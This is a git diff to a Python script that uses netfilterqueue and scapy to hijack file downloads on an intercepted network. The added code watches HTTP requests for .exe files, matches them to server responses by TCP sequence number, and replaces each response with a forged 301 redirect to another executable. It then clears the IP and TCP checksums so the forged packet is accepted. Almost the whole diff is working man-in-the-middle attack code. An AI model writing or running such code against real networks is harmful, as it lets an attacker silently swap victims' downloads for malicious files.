@@ -8,17 +8,32 @@
 import netfilterqueue
 import scapy.all as scapy
 
+ack_list = []
+
+
 def process_packet(packet):
+    redirect_url = "https://www.rarlab.com/rar/winrar-x64-600am.exe"
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.Raw):
         # port 80 is http
-        if scapy_packet[scapy.TCP].dport == 80:
+        if scapy_packet[scapy.TCP].dport == 80:  # request
             if ".exe" in scapy_packet[scapy.Raw].load:
-                print("[+] Detected download of .exe file")
-        elif scapy_packet[scapy.TCP].sport == 80:
-            print("[+] HTTP Respond")
-
+                print("[+] Detected download of .exe file\n")
+                ack_list.append(scapy_packet[scapy.TCP].ack)
+        elif scapy_packet[scapy.TCP].sport == 80:  # response
+            if scapy_packet[scapy.TCP].seq in ack_list:
+                packet.set_payload(str(set_load(scapy_packet, redirect_url)))
     packet.accept()
+
+def set_load(scapy_packet, redirect_url):
+    new_load = "HTTP/1.1 301 Moved Permanently\nLocation: " + redirect_url + "\n\n"
+    print("[+] Modifying package\n")
+    ack_list.remove(scapy_packet[scapy.TCP].seq)
+    scapy_packet[scapy.Raw].load = new_load
+    del scapy_packet[scapy.IP].len
+    del scapy_packet[scapy.IP].chksum
+    del scapy_packet[scapy.TCP].chksum
+    return scapy_packet
 
 
 queue = netfilterqueue.NetfilterQueue()
